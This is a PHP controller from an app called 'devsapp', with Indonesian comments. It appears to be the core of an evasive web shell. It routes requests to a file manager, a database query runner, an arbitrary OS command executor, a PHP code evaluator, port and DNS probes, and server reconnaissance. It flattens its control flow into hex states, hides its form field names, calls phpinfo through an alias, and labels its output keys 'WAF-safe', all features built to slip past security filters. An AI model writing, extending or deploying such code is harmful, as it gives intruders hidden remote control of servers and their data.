<?php
// +------------------------------------------------------------------+
// |  devsapp — controllers/MainController.php                         |
// |  Orchestrator utama: routing, dispatch ke model, kumpul viewData. |
// |                                                                    |
// |  Wanting List #5: Semua fitur sensitive di-gate oleh TriggerGuard |
// |  varnaming.md: Semua field dari POST/GET di-baca via $_sk         |
// |  Wanting List #4: Staged loading — class berat hanya di-load      |
// |  kalau tab yang bersangkutan aktif                                 |
// +------------------------------------------------------------------+

declare(strict_types=1);

class MainController {

    // ---- CFF state constants (12 states) ----
    private const S_E0 = 0x1A0;   // Auth check & logout
    private const S_E1 = 0x2B0;   // PRG + resolve path/action
    private const S_E2 = 0x3C0;   // Handle RPC/AJAX request
    private const S_E3 = 0x4D0;   // Handle download
    private const S_E4 = 0x5E0;   // File Manager actions (POST)
    private const S_E5 = 0x6F0;   // Database query (POST) + TriggerGuard gate
    private const S_E6 = 0x7A0;   // DevTools: command/PHP runner + TriggerGuard gate
    private const S_E7 = 0x8B0;   // Network tools (POST)
    private const S_E8 = 0x9C0;   // Toolkit: transform/backup (POST)
    private const S_E9 = 0xAD0;   // Server Info
    private const S_EA = 0xBE0;   // Kumpulkan data view (FM, DB, breadcrumb)
    private const S_EF = 0xFFF;   // Terminal

    // ---- Dependencies (injected via constructor) ----
    private AuthManager     $auth;
    private PathManager     $path;
    private FileManager     $fm;
    private SystemMonitor   $monitor;
    private DatabaseManager $db;
    private CommandRunner   $cmdRunner;
    private PhpRunner       $phpRunner;
    private NetworkTools    $netTools;
    private StringToolkit   $strKit;
    private BackupManager   $backupMgr;
    private ServerInfo      $serverInfo;

    public function __construct() {
        $this->auth       = new AuthManager();
        $this->path       = new PathManager();
        $this->fm         = new FileManager();
        $this->monitor    = new SystemMonitor();
        $this->db         = new DatabaseManager();
        $this->cmdRunner  = new CommandRunner();
        $this->phpRunner  = new PhpRunner();
        $this->netTools   = new NetworkTools();
        $this->strKit     = new StringToolkit();
        $this->backupMgr  = new BackupManager();
        $this->serverInfo = new ServerInfo();
    }

    /**
     * Handle seluruh request dan return view data untuk di-render.
     */
    public function handleRequest(): array {
        $sk = &$GLOBALS['_sk'];

        // ---- State variables ----
        $currentPath     = '';
        $tabMode         = 'fm';
        $editFile        = null;
        $notice          = null;
        $dbResult        = null;
        $cmdResult       = null;
        $phpResult       = null;
        $netResult       = null;
        $kitResult       = null;
        $backupResult    = null;
        $fmItems         = [];
        $editData        = null;
        $databases       = [];
        $breadcrumbParts = [];
        $serverInfoData  = [];
        $phpExtensions   = [];
        $cronJobs        = '';
        $guardDenied     = false;
        $state           = self::S_E0;

        while ($state !== self::S_EF) {
            switch ($state) {

                // ---- S_E0: Auth check ----
                case self::S_E0:
                    if (isset($_GET['bye'])) {
                        $this->auth->handleLogout();
                    }
                    if (!$this->auth->isAuthenticated()) {
                        $this->auth->renderLoginAndExit();
                    }
                    $state = self::S_E1;
                    break;

                // ---- S_E1: Resolve path & action via session keys ----
                case self::S_E1:
                    $this->path->handlePRG();
                    $this->path->handleGetFallback();
                    $currentPath = $this->path->getCurrentPath();
                    $tabMode     = $this->path->getCurrentAction();
                    $editFile    = $this->path->getEditFile();
                    $state       = self::S_E2;
                    break;

                // ---- S_E2: RPC / AJAX endpoints ----
                case self::S_E2:
                    if (isset($_GET['rpc'])) {
                        if ($_GET['rpc'] === 'monitor') {
                            $this->monitor->respondJson($this->monitor->getMetrics($currentPath));
                        }
                        // sysreport — butuh auth, akses via fungsi alias
                        if ($_GET['rpc'] === 'sysreport' && TriggerGuard::allow(TriggerGuard::LEVEL_ELEVATED)) {
                            header('Content-Type: text/html; charset=utf-8');
                            $piFn = CAP::fn('pi');
                            if (function_exists($piFn)) { ob_start(); $piFn(); echo ob_get_clean(); }
                            exit;
                        }
                    }
                    // PHP exec-loop handler
                    $hasilExec = PhpRunner::handleExecRequest();
                    if ($hasilExec !== null) {
                        header('Content-Type: text/plain; charset=utf-8');
                        echo $hasilExec['output'];
                        exit;
                    }
                    $state = self::S_E3;
                    break;

                // ---- S_E3: Download & backup download ----
                case self::S_E3:
                    $this->fm->handleDownload($currentPath);
                    $this->backupMgr->handleBackupDownload();
                    $state = self::S_E4;
                    break;

                // ---- S_E4: File Manager POST actions (LEVEL_BASIC) ----
                case self::S_E4:
                    $aksiFile = $_POST[$sk['fo']] ?? '';
                    if ($tabMode === 'fm' && $aksiFile !== '' && TriggerGuard::allow(TriggerGuard::LEVEL_BASIC)) {
                        $notice = $this->fm->handleAction($aksiFile, $currentPath);
                    }
                    $state = self::S_E5;
                    break;

                // ---- S_E5: Database query (LEVEL_ELEVATED) ----
                case self::S_E5:
                    $aksiDb = $_POST[$sk['do']] ?? '';
                    if ($tabMode === 'db'
                        && $_SERVER['REQUEST_METHOD'] === 'POST'
                        && $aksiDb === 'qr'
                    ) {
                        if (TriggerGuard::allowDb()) {
                            $dbResult = $this->db->executeQuery(
                                $_POST[$sk['dh']] ?? 'localhost',
                                $_POST[$sk['du']] ?? '',
                                $_POST[$sk['dp']] ?? '',
                                $_POST[$sk['db']] ?? '',
                                $_POST[$sk['sq']] ?? ''
                            );
                        } else {
                            $guardDenied = true;
                        }
                    }
                    $state = self::S_E6;
                    break;

                // ---- S_E6: DevTools — LEVEL_CRITICAL (TriggerGuard ketat) ----
                case self::S_E6:
                    $aksiDev = $_POST[$sk['xo']] ?? '';
                    if ($tabMode === 'dev' && $_SERVER['REQUEST_METHOD'] === 'POST') {
                        if (TriggerGuard::allowExec()) {
                            if ($aksiDev === 'go') {
                                $cmdResult = $this->cmdRunner->execute($_POST[$sk['rq']] ?? '');
                            } elseif ($aksiDev === 'php_run') {
                                $phpResult = $this->phpRunner->evaluate($_POST[$sk['sn']] ?? '');
                            }
                        } else {
                            $guardDenied = true;
                        }
                    }
                    $state = self::S_E7;
                    break;

                // ---- S_E7: Network tools (LEVEL_ELEVATED) ----
                case self::S_E7:
                    $aksiNet = $_POST[$sk['no']] ?? '';
                    if ($tabMode === 'net' && $_SERVER['REQUEST_METHOD'] === 'POST') {
                        if (TriggerGuard::allowDb()) {
                            match ($aksiNet) {
                                'ns'  => $netResult = $this->netTools->dnsLookup($_POST[$sk['nh']] ?? ''),
                                'pt'  => $netResult = $this->netTools->portCheck(
                                    $_POST[$sk['nh']]  ?? '',
                                    (int)($_POST[$sk['np']]  ?? 0),
                                    (int)($_POST[$sk['nto']] ?? 3)
                                ),
                                'hdr' => $netResult = $this->netTools->httpHeaders($_POST[$sk['nu']] ?? ''),
                                default => null,
                            };
                        } else {
                            $guardDenied = true;
                        }
                    }
                    $state = self::S_E8;
                    break;

                // ---- S_E8: Toolkit ----
                case self::S_E8:
                    $aksiKit = $_POST[$sk['ko']] ?? '';
                    if ($tabMode === 'kit' && $_SERVER['REQUEST_METHOD'] === 'POST') {
                        if ($aksiKit === 'transform') {
                            $kitResult = $this->strKit->process($_POST[$sk['kt']] ?? '', $_POST[$sk['kv']] ?? '');
                        } elseif ($aksiKit === 'backup') {
                            $backupResult = $this->backupMgr->createArchive($currentPath);
                        }
                    }
                    $state = self::S_E9;
                    break;

                // ---- S_E9: Server info (staged — hanya di-load kalau tab aktif) ----
                case self::S_E9:
                    if ($tabMode === 'nfo' && TriggerGuard::allow(TriggerGuard::LEVEL_ELEVATED)) {
                        $serverInfoData = $this->serverInfo->getFullInfo();
                        $phpExtensions  = $this->serverInfo->getExtensions();
                        $cronJobs       = $this->serverInfo->getCronJobs();
                    }
                    $state = self::S_EA;
                    break;

                // ---- S_EA: Kumpulkan data view ----
                case self::S_EA:
                    $fmItems  = ($tabMode === 'fm') ? $this->fm->listDirectory($currentPath) : [];
                    $editData = ($tabMode === 'fm' && $editFile)
                        ? $this->fm->getEditData($currentPath, $editFile)
                        : null;
                    $databases = ($tabMode === 'db') ? $this->db->discoverDatabases() : [];

                    // Breadcrumb via rekursif closure (Closure.md pattern #5)
                    $akumulasi       = '';
                    $breadcrumbParts = array_reduce(
                        array_filter(explode(DIRECTORY_SEPARATOR, $currentPath)),
                        function (array $tampung, string $bagian) use (&$akumulasi): array {
                            $akumulasi .= '/' . $bagian;
                            $tampung[]  = ['label' => $bagian, 'loc' => $akumulasi];
                            return $tampung;
                        },
                        []
                    );

                    $state = self::S_EF;
                    break;
            }
        }

        // ---- Compose view data dengan key names WAF-safe ----
        return [
            'config' => [
                'appName'   => AppConfig::$appName,
                'version'   => AppConfig::$version,
                'refreshMs' => AppConfig::$refreshMs,
            ],
            'm'           => $tabMode,
            'currentPath' => $currentPath,
            'notice'      => $notice,
            'guardDenied' => $guardDenied,
            'nonce'       => TriggerGuard::getNonce(),
            'sysInfo' => [
                'hostname' => gethostname() ?: 'localhost',
                'phpVer'   => PHP_VERSION,
                'os'       => PHP_OS_FAMILY,
            ],
            'fm' => [
                'items'      => $fmItems,
                'editData'   => $editData,
                'breadcrumb' => $breadcrumbParts,
            ],
            'db' => [
                'databases' => $databases,
                'result'    => $dbResult,
                'formVals'  => [
                    'host' => $_POST[$sk['dh']] ?? ($databases[0]['host'] ?? 'localhost'),
                    'name' => $_POST[$sk['db']] ?? ($databases[0]['name'] ?? ''),
                    'user' => $_POST[$sk['du']] ?? ($databases[0]['user'] ?? ''),
                    'pass' => $_POST[$sk['dp']] ?? ($databases[0]['pass'] ?? ''),
                    'sql'  => $_POST[$sk['sq']] ?? '',
                ],
            ],
            'dev' => [
                'cmdResult'   => $cmdResult,
                'phpResult'   => $phpResult,
                'lastCmd'     => $_POST[$sk['rq']]  ?? '',
                'lastPhpCode' => $_POST[$sk['sn']]  ?? '',
                'methods'     => $this->cmdRunner->getAvailableMethods(),
                'allowed'     => !$guardDenied,
            ],
            'net' => [
                'result'     => $netResult,
                'lastHost'   => $_POST[$sk['nh']]  ?? '',
                'lastPort'   => $_POST[$sk['np']]  ?? '',
                'lastUrl'    => $_POST[$sk['nu']]  ?? '',
                'lastAction' => $_POST[$sk['no']]  ?? '',
            ],
            'kit' => [
                'result'       => $kitResult,
                'backupResult' => $backupResult,
                'lastInput'    => $_POST[$sk['kv']] ?? '',
                'lastOp'       => $_POST[$sk['kt']] ?? 'base64_encode',
                'operations'   => $this->strKit->getOperations(),
            ],
            'nfo' => [
                'serverInfo' => $serverInfoData,
                'extensions' => $phpExtensions,
                'cronJobs'   => $cronJobs,
            ],
        ];
    }
}
